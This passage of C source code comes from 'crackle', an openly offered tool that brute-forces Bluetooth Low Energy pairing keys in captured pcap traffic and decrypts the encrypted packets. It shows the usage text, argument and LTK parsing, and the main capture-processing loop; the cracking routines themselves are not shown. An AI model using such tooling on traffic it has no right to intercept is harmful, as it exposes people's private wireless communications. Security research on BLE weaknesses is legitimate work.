    connection_state_t *conn;

    assert(state->total_decrypted > 0);

    state->all_decrypted = malloc(sizeof(encrypted_packet_t) *
                                   state->total_decrypted);

    for (i = 0; i <= state->current_conn; ++i) {
        conn = &state->conn[i];

        for (j = 0; j < conn->num_packets; ++j) {
            if (conn->packets[j].dec_data != NULL ) {
                assert(dec < state->total_decrypted);
                state->all_decrypted[dec++] = conn->packets[j];
            }
        }
    }
}

void usage(void) {
    printf("Usage: crackle -i <input.pcap> [-o <output.pcap>] [-l <ltk>] [-s]\n");
    printf("Cracks Bluetooth Low Energy encryption (AKA Bluetooth Smart)\n");
    printf("\n");
    printf("Major modes:  Crack TK // Decrypt with LTK\n");
    printf("\n");
    printf("Crack TK:\n");
    printf("\n");
    printf("    Input is taken as PCAP or PcapNG with one or more connections.\n");
    printf("    Crackle will analyze each connection and determine whether cracking\n");
    printf("    is possible. If possible, it will use one of two techniques. If a\n");
    printf("    complete pairing conversation is present, Crackle will brute force\n");
    printf("    the TK using the fast algorithm. If any of the pairing packets are\n");
    printf("    missing but the minimum required packets are present (LL_ENC_REQ,\n");
    printf("    LL_ENC_RSP, and the two random values), then Crackle will\n");
    printf("    automatically fall back to the slower STK brute force method.\n");
    printf("\n");
    printf("    For each connection with a successfully cracked key exchange,\n");
    printf("    Crackle will decrypt the rest of the conversation and dump the LTK\n");
    printf("    to stdout if found. Specify an output file with -o to dump the\n");
    printf("    original PCAP with the encrypted packets decrypted.\n");
    printf("\n");
    printf("Decrypt with LTK:\n");
    printf("\n");
    printf("    Input PCAP or PcapNG file must contain at least one connection with\n");
    printf("    both LL_ENC_REQ and LL_ENC_RSP (which contain the SKD and IV). The\n");
    printf("    input data will be decrypted if the LTK is correct.\n");
    printf("\n");
    printf("    LTK format: string of hex bytes, no separator, most-significant\n");
    printf("    octet to least-significant octet.\n");
    printf("\n");
    printf("    Example: -l 81b06facd90fe7a6e9bbd9cee59736a7\n");
    printf("\n");
    printf("Optional arguments:\n");
    printf("    -v   Be verbose\n");
    printf("    -t   Run tests against crypto engine\n");
    printf("\n");
    printf("Written by Mike Ryan <mikeryan@lacklustre.net>\n");
    printf("See web site for more info:\n");
    printf("    http://lacklustre.net/projects/crackle/\n");
    exit(1);
}

int main(int argc, char **argv) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *cap;
    pcap_handler packet_handler;
    int cap_dlt;
    int snaplen;
    crackle_state_t state;

    // arguments
    int opt;
    int verbose = 0, do_tests = 0;
    int do_ltk_decrypt = 0;
    int force_strategy = -1;
    char *pcap_file = NULL;
    char *pcap_file_out = NULL;
    char *ltk = NULL;
    uint8_t ltk_bytes[16];

    while ((opt = getopt(argc, argv, "i:o:vts:hl:")) != -1) {
        switch (opt) {
            case 'i':
                pcap_file = strdup(optarg);
                break;

            case 'o':
                pcap_file_out = strdup(optarg);
                break;

            case 'v':
                verbose = 1;
                break;

            case 't':
                do_tests = 1;
                break;

            case 's':
                force_strategy = atoi(optarg);
                if ((force_strategy < 0) || (force_strategy > 2))
                  printf("Invalid strategy value, won't force.\n");
                break;

            case 'l':
                do_ltk_decrypt = 1;
                ltk = strdup(optarg);
                break;

            case 'h':
                usage();
                break;

            case '?':
                usage();
                break;

            default:
                printf("?? getopt wtf 0%o ??\n", opt);
        }
    }

    if (do_tests) {
        run_tests();
        printf("All tests passed\n");
        return 0;
    }

    if (ltk != NULL) {
        int i;
        char byte_str[3] = { 0, };
        unsigned byte;

        // sanity check length
        if (strlen(ltk) != 32) {
            printf("Wrong number of characters in LTK\n");
            return 1;
        }

        // make sure all hex
        for (i = 0; i < 32; ++i) {
            if (!isxdigit(ltk[i])) {
                printf("Invalid character in LTK\n");
                return 1;
            }
        }

        // convert the string
        for (i = 0; i < 16; ++i) {
            byte_str[0] = ltk[2 * i];
            byte_str[1] = ltk[2 * i + 1];
            sscanf(byte_str, "%02x", &byte);
            ltk_bytes[i] = byte;
        }
    }

    if (pcap_file == NULL)
        usage();

    if (pcap_file_out == NULL)
        printf("Warning: No output file specified. "
               "Decrypted packets will be lost to the ether.\n");

    // reset state
    memset(&state, 0, sizeof(state));

    state.btle_handler = enc_data_extractor;
    new_connection_state(&state); // allocate first state

    state.verbose = verbose;

    // load the packets into memory
    cap = pcap_open_offline(pcap_file, errbuf);
    if (cap == NULL)
        errx(1, "%s", errbuf);

    cap_dlt = pcap_datalink(cap);
    snaplen = pcap_snapshot(cap);

    if(verbose)
        printf("PCAP contains [%s] frames\n", pcap_datalink_val_to_name(cap_dlt));

    switch(cap_dlt)
    {
        case BLUETOOTH_LE_LL_WITH_PHDR:
                packet_handler = packet_handler_ble_phdr;
                break;
        case PPI:
                packet_handler = packet_handler_ppi;
                break;
        case NORDIC_BLE_SNIFFER_META:
                packet_handler = packet_handler_nordic;
                break;
        case NORDIC_BLE:
                packet_handler = packet_handler_nordic;
                break;
        default:
                printf("Frames inside PCAP file not supported ! dlt_name=%s\n", pcap_datalink_val_to_name(cap_dlt));
                printf("Frames format supported:\n");
                printf(" [%d] BLUETOOTH_LE_LL_WITH_PHDR\n", BLUETOOTH_LE_LL_WITH_PHDR);
                printf(" [%d] PPI\n", PPI);
                printf(" [%d] NORDIC_BLE_SNIFFER_META\n", NORDIC_BLE_SNIFFER_META);
                printf(" [%d] NORDIC_BLE\n", NORDIC_BLE);
                goto err_out;
                return 1;
    }

    pcap_dispatch(cap, 0, packet_handler, (u_char *)&state);
    pcap_close(cap);

    if (do_ltk_decrypt) {
        ltk_decrypt(&state, ltk_bytes);
    } else {
        do_crack(&state, force_strategy);
    }

    printf("\n");

    if (state.total_decrypted > 0) {
        if (pcap_file_out == NULL) {
            printf("Specify an output file with -o to decrypt packets!\n");
            goto out;
        }

        printf("Decrypted %u packet%s, dumping to PCAP\n",
                state.total_decrypted, state.total_decrypted == 1 ? "" : "s");

        pcap_t *pcap_dumpfile = pcap_open_dead(cap_dlt, snaplen);
        if (pcap_dumpfile == NULL) {
            warn("pcap_open_dead: ");
            goto err_out;
        }
        state.dumper = pcap_dump_open(pcap_dumpfile, pcap_file_out);
        if (state.dumper == NULL) {
            printf("Error opening output PCAP: %s\n", pcap_geterr(pcap_dumpfile));
            pcap_close(pcap_dumpfile);
            goto err_out;
        }

        preprocess_decrypted(&state);
        state.pcap_idx = 0;
        state.btle_handler = packet_decrypter;

        cap = pcap_open_offline(pcap_file, errbuf);
        if (cap == NULL) {
            warn("%s", errbuf);
            goto err_out;
        }
        pcap_dispatch(cap, 0, packet_handler, (u_char *)&state);
        pcap_close(cap);

        pcap_dump_flush(state.dumper);
        pcap_close(pcap_dumpfile);
    } else if (pcap_file_out != NULL) {
        printf("Did not decrypt any packets, not writing a new PCAP\n");
    }

    printf("Done, processed %d total packets, decrypted %d\n", state.total_processed, state.total_decrypted);

    if (state.verbose)
        dump_state(&state);

out:
    free_state(&state);
    free(pcap_file);
    free(pcap_file_out);
    free(ltk);

    return 0;

err_out:
    free_state(&state);
    free(pcap_file);
    free(pcap_file_out);
    free(ltk);

    return 1;
}
